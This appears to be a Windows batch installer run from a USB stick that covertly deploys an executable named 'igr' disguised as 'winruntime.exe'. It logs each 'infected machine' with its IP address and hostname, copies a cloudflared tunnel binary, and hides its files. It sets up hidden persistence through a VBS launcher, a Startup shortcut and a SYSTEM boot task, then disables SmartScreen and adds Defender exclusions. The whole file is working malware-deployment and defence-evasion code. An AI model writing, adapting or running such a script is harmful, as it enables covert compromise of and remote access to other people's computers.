@echo off
setlocal enabledelayedexpansion

REM Detect versioned exe in subfiles
set "IGR_EXE="
for %%f in ("%~dp0subfiles\igr_v*.exe") do set "IGR_EXE=%%~nxf"
if not defined IGR_EXE if exist "%~dp0subfiles\igr.exe" set "IGR_EXE=igr.exe"
if not defined IGR_EXE (
    echo ERROR: No igr exe found in subfiles\
    pause
    exit /b 1
)

REM Try admin elevation - continue without if denied
set "HAS_ADMIN=0"
>nul 2>&1 net session && set "HAS_ADMIN=1"
if "%HAS_ADMIN%"=="0" (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs" 2>nul
    if errorlevel 1 (
        echo   Admin denied - continuing with limited privileges
        set "HAS_ADMIN=0"
    ) else (
        exit /b
    )
)

echo ============================================
echo   IGR Setup - Silent Auto-Start Deploy
echo ============================================
echo.

REM Get the directory where this batch file is located (USB stick root)
set "USB_ROOT=%~dp0"
set "SOURCE_DIR=%USB_ROOT%subfiles"

echo   USB Root: %USB_ROOT%
echo   Source:   %SOURCE_DIR%
echo   Admin:    %HAS_ADMIN%
echo.

REM Log infection to r.txt on USB stick
echo [1/9] Logging infection...
set "LOG_FILE=%SOURCE_DIR%\r.txt"
echo [%DATE% %TIME%] IGR infected machine >> "%LOG_FILE%"
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do (
    echo   IP: %%a >> "%LOG_FILE%"
)
echo   Host: %COMPUTERNAME% >> "%LOG_FILE%"
echo. >> "%LOG_FILE%"
echo   Logged to: %LOG_FILE%

REM Check for required files
echo.
echo [2/9] Checking files...
if not exist "%SOURCE_DIR%\%IGR_EXE%" (
    echo   ERROR: %IGR_EXE% not found in subfiles\
    echo   Build it first: run build.bat
    pause
    exit /b 1
)
echo   Found: %SOURCE_DIR%\%IGR_EXE%
if exist "%SOURCE_DIR%\cloudflared.exe" (
    echo   Found: %SOURCE_DIR%\cloudflared.exe
) else (
    echo   cloudflared.exe not found - will be auto-downloaded on first run
)

REM Create hidden directory in AppData
set "INSTALL_DIR=%APPDATA%\Microsoft\WindowsRuntime"
echo.
echo [3/9] Creating install directory...
echo   Path: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

REM Kill any running instance before overwriting
echo   Stopping any running instance...
taskkill /f /im winruntime.exe >nul 2>&1
taskkill /f /im cloudflared.exe >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
echo   Done.

REM Copy executable
echo.
echo [4/9] Copying executable...
copy "%SOURCE_DIR%\%IGR_EXE%" "%INSTALL_DIR%\winruntime.exe"
if errorlevel 1 (
    echo   ERROR: Failed to copy executable
    pause
    exit /b 1
)
echo   Done.

REM Copy cloudflared if present
if exist "%SOURCE_DIR%\cloudflared.exe" (
    echo   Copying cloudflared.exe...
    copy /y "%SOURCE_DIR%\cloudflared.exe" "%INSTALL_DIR%\cloudflared.exe" >nul 2>&1
    if errorlevel 1 (
        echo   WARNING: cloudflared.exe locked by running process - will be updated on next start
    ) else (
        echo   Done.
    )
)

REM Create VBS launcher (completely invisible - no window flash at all)
set "VBS_LAUNCHER=%INSTALL_DIR%\winruntime.vbs"
echo.
echo [5/9] Creating invisible launcher...
echo   Path: %VBS_LAUNCHER%
echo Set objShell = CreateObject("WScript.Shell") > "%VBS_LAUNCHER%"
echo objShell.Run """%INSTALL_DIR%\winruntime.exe""", 0, False >> "%VBS_LAUNCHER%"
echo   Done.

REM Create startup shortcut (works WITHOUT admin - runs after login)
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=%STARTUP_DIR%\WindowsRuntime.lnk"
echo.
echo [6/9] Creating startup shortcut...
echo   Shortcut: %SHORTCUT%
powershell -Command "$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut('%SHORTCUT%'); $sc.TargetPath = 'wscript.exe'; $sc.Arguments = '\"%INSTALL_DIR%\winruntime.vbs\"'; $sc.WindowStyle = 7; $sc.Save()"
echo   Done.

REM Register scheduled task (admin only - starts BEFORE login)
echo.
echo [7/9] Registering scheduled task...
if "%HAS_ADMIN%"=="1" (
    echo   Task: WindowsRuntime (at boot)
    powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%INSTALL_DIR%\winruntime.vbs\"'; $trigger = New-ScheduledTaskTrigger -AtStartup; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 365) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1); Register-ScheduledTask -TaskName 'WindowsRuntime' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force"
    if errorlevel 1 (
        echo   WARNING: Scheduled task failed - will start after login only
    ) else (
        echo   Done. Starts at boot BEFORE anyone logs in.
    )
) else (
    echo   Skipped - no admin. Will start after login instead.
)

REM Set file attributes to hidden
echo.
echo [8/9] Hiding files...
attrib +h "%INSTALL_DIR%"
attrib +h "%INSTALL_DIR%\winruntime.exe"
attrib +h "%INSTALL_DIR%\winruntime.vbs"
if exist "%INSTALL_DIR%\cloudflared.exe" attrib +h "%INSTALL_DIR%\cloudflared.exe"
echo   Done.

REM Disable SmartScreen + Defender exclusions (admin only)
if "%HAS_ADMIN%"=="1" (
    echo   Disabling SmartScreen...
    powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue"
    echo   Adding Defender exclusions...
    powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'winruntime.exe' -Force -ErrorAction SilentlyContinue"
    echo   Done.
) else (
    echo   SmartScreen/Defender bypass skipped - no admin
)

REM Launch service immediately
echo.
echo [9/9] Starting service now...
wscript.exe //b "%VBS_LAUNCHER%"
echo   Done. Service is running.

REM Summary
echo.
echo ============================================
echo   SUMMARY
echo ============================================
echo   Installed to:  %INSTALL_DIR%\
echo   Executable:    %INSTALL_DIR%\winruntime.exe
echo   Launcher:      %INSTALL_DIR%\winruntime.vbs
echo   Startup link:  %SHORTCUT%
if "%HAS_ADMIN%"=="1" (
echo   Scheduled task: WindowsRuntime (at boot)
) else (
echo   Scheduled task: Skipped (no admin)
)
echo   Status:        RUNNING NOW
echo.
echo   TO REMOVE later:
echo     1. Run: taskkill /f /im winruntime.exe
echo     2. Run: schtasks /delete /tn WindowsRuntime /f
echo     3. Delete: %SHORTCUT%
echo     4. Delete: %INSTALL_DIR%\
echo     5. Delete: %APPDATA%\.igr_path
echo ============================================
echo.
echo   Completely invisible - no window, no terminal.
echo   You can now remove the USB stick.
echo.
pause